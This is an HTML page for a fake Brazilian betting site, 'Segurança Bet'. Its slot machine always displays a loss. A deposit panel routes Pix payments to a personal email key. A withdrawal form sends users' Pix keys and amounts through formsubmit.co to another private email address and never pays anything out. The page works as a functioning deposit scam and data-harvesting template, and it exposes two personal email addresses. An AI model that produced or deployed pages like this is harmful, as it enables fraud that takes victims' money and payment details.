<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Segurança Bet</title>
  <style>
    body {
      background-color: #0b0b0b;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    .game {
      background: #222;
      padding: 20px;
      margin: 20px auto;
      border-radius: 10px;
      width: 300px;
    }
    button {
      background: #00e676;
      border: none;
      padding: 10px 20px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      margin: 10px;
    }
    #deposit, #withdraw {
      background: #1e88e5;
      color: white;
    }
    #result {
      margin-top: 10px;
    }
    .pix-box {
      background: #333;
      padding: 20px;
      margin-top: 20px;
      border-radius: 10px;
    }
    img {
      max-width: 200px;
    }
  </style>
</head>
<body>
  <h1>Segurança Bet</h1>
  <h2>Saldo: R$ 0,00</h2>

  <div class="game">
    <p>Caça-Níquel Fake</p>
    <button onclick="spin()">Girar</button>
    <p id="result">Você perdeu!</p>
  </div>

  <button id="deposit" onclick="showPix()">Depositar via Pix</button>
  <button id="withdraw" onclick="showWithdraw()">Sacar via Pix</button>

  <div id="pix" class="pix-box" style="display:none;">
    <h3>Deposite com Pix</h3>
    <p>Chave: joao.rooaz@gmail.com</p>
    <p>Copia e Cola:</p>
    <textarea rows="3" cols="40">00020126590014br.gov.bcb.pix0120joao.rooaz@gmail.com0213SEGURANCABET@5204000053039865802BR5901N6001C62070503***6304573D</textarea>
    <br>
    <img src="qrcode.png" alt="QR Code Pix">
  </div>

  <div id="form" class="pix-box" style="display:none;">
    <h3>Solicitar Saque</h3>
    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="text" name="chave_pix" placeholder="Sua chave Pix" required><br><br>
      <input type="text" name="valor" placeholder="Valor do saque" required><br><br>
      <button type="submit">Enviar</button>
    </form>
    <p>Aguardando processamento...</p>
  </div>

  <script>
    function spin() {
      document.getElementById('result').innerText = "Você perdeu!";
    }
    function showPix() {
      document.getElementById('pix').style.display = 'block';
    }
    function showWithdraw() {
      document.getElementById('form').style.display = 'block';
    }
  </script>
</body>
</html>
